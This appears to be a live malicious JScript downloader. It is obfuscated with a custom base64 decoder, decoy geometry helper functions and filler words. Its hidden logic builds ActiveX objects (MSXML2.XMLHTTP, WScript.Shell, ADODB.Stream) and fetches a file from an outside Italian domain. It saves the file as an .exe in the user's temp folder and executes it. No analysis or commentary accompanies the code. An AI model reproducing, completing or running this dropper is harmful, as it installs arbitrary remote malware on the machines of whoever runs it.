
var roundabout = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  requirement = [];
	
var pantry = { ':': '.','U': 'S','381': 'X'};
	var resulting = 0;


function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function customer(printing) {
	disillusion = printing;
	for (var i in pantry){disillusion = disillusion.replace(i, pantry[i]);}
    return disillusion;
};

var beautifully = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.customer4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.replace(/crack/g, '')
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = roundabout[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = roundabout[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = roundabout[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = roundabout[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var biodiversity ="crackJVcrackRFTVcrackAl".customer4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var switches = "crackQWcrackN0aXZcracklWE9iacrackmVjdA=crack=".customer4();
String.prototype.customer2 = function () {
    var modular = {
        bookstore: this
    };
    modular.tacitly = modular.bookstore["c3Vic3RyaW5n".customer4()](resulting, beautifully);
    return modular.tacitly;
};

var boutique ="crackRXhwYW5crackkRW52aXcrackJvbm1lbnRTdHJcrackpbmdz".customer4();
var Native = function(options){
	
};
var divination = [switches, boutique,biodiversity,  ""+"."+("medicines","mignonette","portly","printer","alternation","wetted","fisher","britannica","exe"), "UnVu".customer4(), customer("M"+"SX"+"ML"+("fence","masonic","infinite","technician","untie","lineage","pallet","2.")+"381M"+"LH"+"TT"+("cancer","terry","translator","weakening","superlative","meteor","institute","fairfield","P>")+"WU"+("roland","asthma","adrian","altruistic","segments","transit","devotedness","cr")+("avaricious","miser","chops","sabre","shrub","commitment","guarantee","hundred","ip")+"t:"+("yeomanry","madras","diluted","mostly","witnesses","palmy","hindrance","kingly","Sh")+"ell")];
watchword = "_F2_";
var effulgent = this[divination.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
MYfrsiV = "xggQun";
sherman = (("poison", "farming", "rogers", "tragedy", "esperanto", "bowling", "distraction", "prlqVHMruJf") + "RLcJzzGlJhp").customer2();
kernel = (("shyness", "vertigo", "splitting", "lucca", "consolidated", "supreme", "paradox", "sententious", "latina", "sMxzQUa") + "kQnoaCVJryu").customer2();
  
    String.prototype.capable = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var gregory = divination.pop().split(">");

muslims = "b3Blbg==".customer4();
var trinidad = new effulgent(gregory[1]);
var diffidence = new effulgent(gregory[0]);
var target = trinidad[divination.shift()](divination.shift());
weasel = "E";

var rosary = divination.shift();
var usual = divination.shift();
function benjamin(outdoor, mothers) {

    try {
        var holier = target + "/" + mothers ;
		holier = holier+ rosary;
            diffidence[muslims](("child","lavishly","bukkake","sensitivity","marion","fiftyeight","exhaust","documentary","G" + weasel) + ("memento","pharmaceutical","antigua","deborah","queenly","affect","confusion","flabby","cingular","hitting","T"), outdoor, false);
       
    diffidence[kernel + ("inquisitively","labels","end")]();
	var nimbus=("sherman" + WScript=="sherman" + "V2luZG93cyBTY3JpcHQgSG9zdA==".customer4())&&diffidence["c3RhdHVz".customer4()] +""=="MjAw".customer4()&&typeof(vlvqjeMFF)==="undefined";

    if (nimbus) {
		
        var evident = new effulgent((("tears","pharmacology","justin","mazda","premises","affluence","smilies","puppy","A")+("serbian","quarters","mounted","untimely","parker","crags","removed","yeomanry","SEOO")+"DB"+("source","plausibly","lusitania","animates","integrated","smell","exists",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        evident[muslims]();
        iCGbgDy = "_F9_";
        evident.type = beautifully;
        VwtPTf = "_F10_";
        evident["d3JpdGU=".customer4()](diffidence[("adage","pensions","astounded","audio","generally","tattered","exordium","")+"R"+"es"+"pon"+pantry['U'].toLowerCase()+"e"+"Qm9keQ==".customer4()]);
        xbhCPoMpC = "_F11_";
        evident[(sherman + "o"+("solstice","jetty","printable","petroleum","monkey","purplish","harold","approx","00")+("girls","atrophy","promotions","probation","acquired","nicaragua","workshop","8i")+"tion").replace("0"+("herculean","unfashionable","silky","pericles","optical","rosary","multiple","08"), kernel)] = 0;
        SrgqLhtmaHK = "_F12_";
        evident.saveToFile(holier, 2);
        YvsljCXlE = "_F13_";
        evident.close();
        pLLdEcP = "_F14_";
		trinidad[usual](holier, beautifully, true);
    }
} catch (vnehmlrQjoY) { };

    TxSOcKjDf = "_F15_";
}
try{
benjamin("aHRcrack0cDcrackovLw=crack=".customer4()+"\u0077\u0077\u0077"+"\u002E\u0073\u0074\u0075\u0064\u0069\u006F\u0070\u0061\u006E\u0065\u006C\u006C\u0061\u002E\u0069\u0074\u002F\u0037\u0038\u0074\u0067\u0037\u0036\u0038\u0062" + "?qqoCctE=BqvelxCQjh","rtIlbwQSVbS");}catch(mPmVMSJiWmA){}

   HhOmumkBcJ = "_F16_";
   